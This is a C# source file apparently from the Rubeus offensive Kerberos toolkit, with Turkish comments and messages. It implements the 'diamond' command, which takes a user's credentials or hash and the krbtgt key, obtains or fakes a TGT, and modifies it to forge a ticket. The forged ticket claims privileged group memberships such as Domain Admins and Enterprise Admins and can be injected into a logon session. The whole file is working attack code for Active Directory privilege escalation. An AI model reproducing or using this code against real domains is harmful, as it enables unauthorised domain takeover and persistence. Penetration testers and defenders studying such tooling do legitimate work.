using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Diamond : ICommand
    {
        public static string CommandName => "diamond";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Eylem: Diamond Ticket\r\n");

            string user = "";
            string domain = "";
            string password = "";
            string hash = "";
            string dc = "";
            string outfile = "";
            string certificate = "";
            string krbKey = "";
            string ticketUser = "";
            string groups = "520,512,513,519,518";
            int ticketUserId = 0;
            string sids = "";

            bool ptt = arguments.ContainsKey("/ptt");
            bool tgtdeleg = arguments.ContainsKey("/tgtdeleg");
            LUID luid = new LUID();
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/sids"))
            {
                sids = arguments["/sids"];
            }
            encType = Interop.KERB_ETYPE.rc4_hmac; //eger /enctype belirtilmemisse varsayilan
            if (arguments.ContainsKey("/enctype")) {
                string encTypeString = arguments["/enctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM")) {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                } else if (encTypeString.Equals("AES128")) {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                } else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES")) {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                } else if (encTypeString.Equals("DES")) {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            if (arguments.ContainsKey("/password"))
            {
                password = arguments["/password"];

                string salt = String.Format("{0}{1}", domain.ToUpper(), user);

                // bilgisayar hesabi salt'lari icin ozel durum
                if (user.EndsWith("$"))
                {
                    salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), user.TrimEnd('$').ToLower(), domain.ToLower());
                }

                // Kerberos AES sifrelemesini desteklemek icin samaccountname sahteciligi ozel durumu
                if (arguments.ContainsKey("/oldsam"))
                {
                    salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), arguments["/oldsam"].TrimEnd('$').ToLower(), domain.ToLower());

                }

                hash = Crypto.KerberosPasswordHash(encType, password, salt);
            }

            else if (arguments.ContainsKey("/des"))
            {
                hash = arguments["/des"];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/ntlm"))
            {
                hash = arguments["/ntlm"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/aes128"))
            {
                hash = arguments["/aes128"];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            
            if (arguments.ContainsKey("/certificate")) {
                certificate = arguments["/certificate"];
            }
            if (arguments.ContainsKey("/krbkey")) {
                krbKey = arguments["/krbkey"];
            }
            if (arguments.ContainsKey("/ticketuser"))
            {
                ticketUser = arguments["/ticketuser"];
            }
            if (arguments.ContainsKey("/groups")) 
            {
                groups = arguments["/groups"];
            }

            if (arguments.ContainsKey("/ticketuserid"))
            {
                ticketUserId = int.Parse(arguments["/ticketuserid"]);
            }

            if (arguments.ContainsKey("/luid"))
            {
                try
                {
                    luid = new LUID(arguments["/luid"]);
                }
                catch
                {
                    Console.WriteLine("[X] Gecersiz LUID formati ({0})\r\n", arguments["/luid"]);
                    return;
                }
            }

            if (arguments.ContainsKey("/createnetonly"))
            {
                // eger ticket'i uygulamak icin gizli bir surec baslatiyorsak
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine("[X] Olusturulan logon session'a bir ticket uygulamak icin yuksek butunluk (high integrity) seviyesinde olmaniz gerekir");
                    return;
                }
                if (arguments.ContainsKey("/show"))
                {
                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], true);
                }
                else
                {
                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], false);
                }
                Console.WriteLine();
            }

           if (tgtdeleg)
           {
                KRB_CRED cred = null;
                try {
                    cred = new KRB_CRED(LSA.RequestFakeDelegTicket());
                }
                catch {
                    Console.WriteLine("[X] tgtdeleg kullanilarak TGT alinamadi");
                    return;
                }
                ForgeTickets.ModifyTicket(cred, krbKey, krbKey, outfile, ptt, luid, ticketUser, groups, ticketUserId, sids);
            }
            else
            {
                if (String.IsNullOrEmpty(certificate))
                    ForgeTickets.DiamondTicket(user, domain, hash, encType, outfile, ptt, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
                else
                    ForgeTickets.DiamondTicket(user, domain, certificate, password, encType, outfile, ptt, dc, luid, krbKey, ticketUser, groups, ticketUserId, sids);
            }

            return;
        }
    }
}
